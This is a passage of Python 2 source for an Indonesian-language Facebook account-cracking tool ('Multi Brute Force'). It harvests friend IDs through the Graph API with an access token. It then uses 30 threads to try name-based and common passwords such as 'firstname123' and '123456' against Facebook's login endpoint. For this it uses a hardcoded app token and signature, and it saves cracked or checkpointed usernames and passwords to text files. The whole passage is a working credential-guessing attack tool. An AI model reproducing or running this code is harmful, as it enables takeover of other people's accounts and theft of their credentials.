                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/post.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/post.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '1234'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/post.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/post.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone post.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_japan():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;97m _________   \x1b[1;91m _____\x1b[1;97m___.    '
    print '\x1b[1;97m \\_   ___ \\ \x1b[1;91m_/ ____\x1b[1;97m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;97m /    \\  \\/ \x1b[1;91m\\   __\\ \x1b[1;97m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____ \x1b[1;91m|  |  \x1b[1;97m | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  / \x1b[1;91m|__|  \x1b[1;97m |___  /'
    print '\x1b[1;97m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mJapan\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_japan()


def pilih_japan():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_japan()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   \x1b[1;91m _____\x1b[1;97m___.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;91m_/ ____\x1b[1;97m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;91m\\   __\\ \x1b[1;97m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;91m|  |  \x1b[1;97m | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;91m|__|  \x1b[1;97m |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '              \x1b[1;94m>>> \x1b[1;93mCRACK JAPAN \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   \x1b[1;91m _____\x1b[1;97m___.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;91m_/ ____\x1b[1;97m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;91m\\   __\\ \x1b[1;97m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;91m|  |  \x1b[1;97m | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;91m|__|  \x1b[1;97m |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '              \x1b[1;94m>>> \x1b[1;93mCRACK JAPAN \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_japan()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   \x1b[1;91m _____\x1b[1;97m___.    '
            print '\x1b[1;97m \\_   ___ \\ \x1b[1;91m_/ ____\x1b[1;97m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/ \x1b[1;91m\\   __\\ \x1b[1;97m| __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____ \x1b[1;91m|  |  \x1b[1;97m | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  / \x1b[1;91m|__|  \x1b[1;97m |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '              \x1b[1;94m>>> \x1b[1;93mCRACK JAPAN \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_japan()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_japan()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/japan.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/japan.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/japan.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/japan.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/japan.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/japan.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Password'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/japan.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/japan.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '123456'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/japan.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/japan.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/japan.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/japan.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
